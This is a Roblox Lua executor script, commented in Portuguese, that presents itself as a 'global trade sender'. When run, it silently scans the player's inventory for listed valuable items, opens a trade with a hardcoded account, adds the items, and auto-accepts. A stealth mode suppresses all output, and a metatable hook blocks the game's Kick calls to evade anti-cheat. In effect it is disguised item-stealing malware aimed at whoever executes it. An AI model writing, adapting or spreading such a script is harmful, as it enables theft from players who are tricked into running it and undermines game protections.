-- BRAINROT GLOBAL TRADE SENDER v3.0
-- https://github.com/seuusuario/seurepositorio

local Config = {
    Alvo = "GUIGUI_PANDABR",
    UserIdAlvo = nil,
    AutoAceitar = true,
    ModoStealth = true,
    DelayEntreAcoes = 0.5
}

local BrainrotsParaEnviar = {
    ["Celularcini Viciosini"] = true,
    ["Dragon Cannelloni"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Fragola La La La"] = true,
    ["Gym Bros"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Capitano Moby"] = true,
    ["Griffin"] = true,
    ["Burguro And Fryuro"] = true,
    ["Los Bros"] = true,
    ["Garama and Madundung"] = true,
    ["Meowl"] = true,
    ["Cerberus"] = true,
    ["Los Sekolahs"] = true,
    ["Tictac Sahur"] = true,
    ["Festive 67"] = true
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

local function Log(msg)
    if not Config.ModoStealth then
        print("[BrainrotTrade] " .. msg)
    end
end

local TradeGlobal = {
    Remotes = {},
    UserIdAlvo = nil,
    ItensEncontrados = {}
}

function TradeGlobal:DetectarRemotes()
    Log("Detectando remotes...")
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local nome = string.lower(obj.Name)
            if string.find(nome, "trade") or string.find(nome, "request") or 
               string.find(nome, "send") or string.find(nome, "offer") or
               string.find(nome, "accept") or string.find(nome, "confirm") or
               string.find(nome, "add") or string.find(nome, "item") then
                table.insert(self.Remotes, obj)
            end
        end
    end
    
    local pastas = {"Trade", "Trading", "Network", "Remotes", "Events", "Brainrot", "Items", "Inventory", "Data", "API", "Services"}
    for _, nomePasta in ipairs(pastas) do
        local pasta = ReplicatedStorage:FindFirstChild(nomePasta)
        if pasta then
            for _, obj in ipairs(pasta:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    table.insert(self.Remotes, obj)
                end
            end
        end
    end
end

function TradeGlobal:ObterUserIdAlvo()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == Config.Alvo or p.DisplayName == Config.Alvo then
            self.UserIdAlvo = p.UserId
            Log("UserId local: " .. self.UserIdAlvo)
            return self.UserIdAlvo
        end
    end
    
    local success, result = pcall(function()
        local url = "https://users.roblox.com/v1/users/search?keyword=" .. Config.Alvo .. "&limit=1"
        local response = game:HttpGet(url)
        local data = HttpService:JSONDecode(response)
        if data and data.data and #data.data > 0 then
            return data.data[1].id
        end
        return nil
    end)
    
    if success and result then
        self.UserIdAlvo = result
        Log("UserId API: " .. self.UserIdAlvo)
        return self.UserIdAlvo
    end
    
    self.UserIdAlvo = Config.Alvo
    return self.UserIdAlvo
end

function TradeGlobal:ScanInventario()
    Log("Scanning inventário...")
    local itens = {}
    local locais = {
        Player:FindFirstChild("Data"),
        Player:FindFirstChild("Inventory"),
        Player:FindFirstChild("Brainrots"),
        Player:FindFirstChild("Items")
    }
    
    local invStorage = ReplicatedStorage:FindFirstChild("Inventories")
    if invStorage then
        local playerInv = invStorage:FindFirstChild(Player.Name) or invStorage:FindFirstChild(tostring(Player.UserId))
        if playerInv then
            table.insert(locais, playerInv)
        end
    end
    
    for _, localPossivel in ipairs(locais) do
        if localPossivel then
            for _, item in ipairs(localPossivel:GetDescendants()) do
                if BrainrotsParaEnviar[item.Name] then
                    table.insert(itens, {
                        nome = item.Name,
                        objeto = item,
                        quantidade = item:IsA("IntValue") and item.Value or 1,
                        id = item:GetAttribute("ID") or item.Name
                    })
                    Log("Encontrado: " .. item.Name)
                end
            end
        end
    end
    
    for _, gui in ipairs(PlayerGui:GetDescendants()) do
        if gui:IsA("TextLabel") or gui:IsA("ImageLabel") then
            if BrainrotsParaEnviar[gui.Name] then
                local jaExiste = false
                for _, item in ipairs(itens) do
                    if item.nome == gui.Name then
                        jaExiste = true
                        break
                    end
                end
                if not jaExiste then
                    table.insert(itens, {
                        nome = gui.Name,
                        objeto = gui,
                        quantidade = 1,
                        id = gui.Name
                    })
                end
            end
        end
    end
    
    self.ItensEncontrados = itens
    Log("Total: " .. #itens)
    return itens
end

function TradeGlobal:EnviarTradeGlobal()
    if not self.UserIdAlvo then
        Log("UserId não definido")
        return false
    end
    
    Log("Enviando trade para " .. Config.Alvo)
    
    for _, remote in ipairs(self.Remotes) do
        local nome = string.lower(remote.Name)
        
        if string.find(nome, "trade") or string.find(nome, "request") then
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(self.UserIdAlvo)
                else
                    remote:InvokeServer(self.UserIdAlvo)
                end
            end)
        end
        
        pcall(function()
            remote:FireServer("send", self.UserIdAlvo)
        end)
        
        pcall(function()
            remote:FireServer({
                Action = "Trade",
                Target = self.UserIdAlvo,
                Type = "Global"
            })
        end)
    end
    
    pcall(function()
        if _G.SendTrade then
            _G.SendTrade(self.UserIdAlvo)
        end
        if getfenv().SendTrade then
            getfenv().SendTrade(self.UserIdAlvo)
        end
    end)
    
    return true
end

function TradeGlobal:AdicionarItensAoTrade()
    Log("Adicionando itens...")
    for _, item in ipairs(self.ItensEncontrados) do
        for _, remote in ipairs(self.Remotes) do
            local nome = string.lower(remote.Name)
            if string.find(nome, "add") or string.find(nome, "item") then
                pcall(function()
                    remote:FireServer(item.nome)
                    remote:FireServer(item.id)
                    remote:FireServer("add", item.nome)
                    remote:FireServer({
                        Item = item.nome,
                        ID = item.id,
                        Quantity = item.quantidade
                    })
                end)
            end
        end
        task.wait(Config.DelayEntreAcoes)
    end
end

function TradeGlobal:AceitarTrade()
    if not Config.AutoAceitar then return end
    task.wait(2)
    
    Log("Aceitando trade...")
    for _, remote in ipairs(self.Remotes) do
        local nome = string.lower(remote.Name)
        if string.find(nome, "accept") or string.find(nome, "confirm") then
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(true)
                    remote:FireServer("accept")
                    remote:FireServer("confirm")
                else
                    remote:InvokeServer(true)
                end
            end)
        end
    end
    
    for _, gui in ipairs(PlayerGui:GetDescendants()) do
        if gui:IsA("TextButton") or gui:IsA("ImageButton") then
            local btnNome = string.lower(gui.Name)
            if string.find(btnNome, "accept") or string.find(btnNome, "confirm") or string.find(btnNome, "yes") then
                pcall(function()
                    gui.MouseButton1Click:Fire()
                end)
            end
        end
    end
end

function TradeGlobal:Executar()
    Log("=== INICIADO ===")
    self:DetectarRemotes()
    task.wait(1)
    self:ObterUserIdAlvo()
    task.wait(0.5)
    self:ScanInventario()
    
    if #self.ItensEncontrados == 0 then
        Log("Nenhum brainrot encontrado, tentando mesmo assim...")
    end
    
    self:EnviarTradeGlobal()
    task.wait(2)
    self:AdicionarItensAoTrade()
    task.wait(1)
    self:AceitarTrade()
    Log("=== CONCLUÍDO ===")
end

-- Proteção
local mt = getrawmetatable(game)
if mt then
    setreadonly(mt, false)
    local oldNamecall = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        if method == "Kick" or method == "kick" then
            return nil
        end
        return oldNamecall(self, ...)
    end)
    setreadonly(mt, true)
end

-- Iniciar
task.spawn(function()
    task.wait(math.random(2, 4))
    TradeGlobal:Executar()
end)

task.spawn(function()
    task.wait(10)
    if #TradeGlobal.ItensEncontrados == 0 then
        TradeGlobal:Executar()
    end
end)

Log("Carregado. Aguardando...")
